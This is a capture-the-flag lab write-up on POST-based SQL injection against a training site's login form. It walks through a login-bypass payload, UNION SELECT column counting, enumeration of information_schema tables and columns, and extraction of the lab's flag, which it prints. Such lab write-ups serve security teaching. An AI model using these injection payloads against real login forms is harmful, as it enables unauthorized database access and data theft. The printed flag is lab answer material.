# Lab 6.6.2 SQL Post Injection

## 0x00 Basic Knowledge

POST Injuection is generally same as GET. The only difference is about how they transfer parameters to server.

POST injection normally appears at:

- Login form
- Query form
- and all other forms which may interact with database

A typical example is login bypass.

```sql
") OR 1=1#
```

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/home.jpg)

### Injection Point

```sql
") OR 1=1#
```

![](./imgs/login.jpg)

### Field Number

So there are 2 fields for UNION SELECT

```sql
") OR 1=1 ORDER BY 1,2#
```

![](./imgs/order.jpg)

### Display Location

```sql
") AND 1=2 UNION SELECT 1,2#
```

![](./imgs/display.jpg)

### TABLE_NAME

```sql
") AND 1=2 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()#
```

![](./imgs/table_name.jpg)

| OFFSET | TABLE_NAME   |
| ------ | ------------ |
| 0      | emails       |
| 1      | referers     |
| 2      | uagents      |
| 3      | users        |
| 4      | zkaq         |

The useful table should be **zkaq**

### COLUMN_NAME

```sql
") AND 1=2 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq'#
```

| OFFSET | COLUMN_NAME  |
| ------ | ------------ |
| 0      | flag         |
| 1      | zKaQ         |

![](./imgs/column_name.jpg)

### FLAG

```sql
") AND 1=2 UNION SELECT 1,zKaQ FROM zkaq WHERE flag=17#
```

![](./imgs/flag.jpg)

**FLAG** = **zKaQ-P0stD0ubl4**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=551636dc27a173b1
[2]: http://120.203.13.75:8150/New/PostBased/RankTwo/sql-two/
